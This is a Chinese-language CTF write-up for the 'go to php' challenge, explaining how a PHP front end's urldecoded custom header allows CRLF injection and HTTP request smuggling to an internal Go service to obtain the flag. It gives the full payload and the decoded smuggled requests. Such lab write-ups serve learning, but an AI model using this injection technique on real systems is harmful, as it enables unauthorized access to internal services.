---
title: go to php - HTTP 请求走私
date: 2026-08-30 23:15:00
categories:
  - CTF wp
tags:
  - CTF
  - HTTP请求走私
description: go to php - HTTP 请求走私
---

index.php看源码：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-go-to-php-http-smuggling-001.png)

`RequestVenom` 直接把用户控制的 `path` 拼接到固定的内部地址 `http://localhost:8080`，然后用 `file_get_contents` 发起请求

lib.php

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-go-to-php-http-smuggling-002.png)

接收CTF2026请求的内容，并url解码拼接进 HTTP header，pash中过滤了flag

go.go

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-go-to-php-http-smuggling-003.png)

/write路径可以写入文件，需要name和path两个参数，但是如果参数不对就会显示bad note

所以利用HTTP请求走私，同时向go发送两个请求，都带有相同的X-Trace编号，使解析为name=AAA&path=z.txt是合法的，同时请求flag也带有授权 T1，被视为合法，即可返回 flag

所以：

```plain
外层请求:  /?path=/write?name=AAA%26path=z.txt
                     + ctf2026 头走私 /flag
                     ↓
PHP 的 $path     = /write?name=AAA&path=z.txt
                     ↓
PHP 发去 Go      = http://localhost:8080/write?name=AAA&path=z.txt
                     ↓
Go 解析出两个请求:
   ① GET /write?name=AAA&path=z.txt  (X-Trace: T1)
      → name=AAA 非空 ✓, path=z.txt 合法 ✓
      → writeAndGrant → 授权 T1
   ② GET /flag (X-Trace: T1)
      → grants[T1] 命中 → 返回 flag
```

payload:

```plain
GET /?path=/write?name=AAA%26path=z.txt
CTF2026: a%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1
```

**请求头**** CRLF 注入**`$header` 来自我们请求的 `HTTP_CTF2026` 头，而 `urldecode` 能把 `%0d%0a` 变成**真实的 **`**\r\n**`**，**%0d%0a就是`\r\n`的url编码，所以payload解析就是：

```plain
GET /write?name=AAA&path=z.txt HTTP/1.1    
ctf2026: a                                 
Host: localhost:8080                      
X-Trace: T1                              
                                       
GET /flag HTTP/1.1                         
Host: localhost:8080                     
X-Trace: T1                            
Connection: keep-alive
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-go-to-php-http-smuggling-004.png)

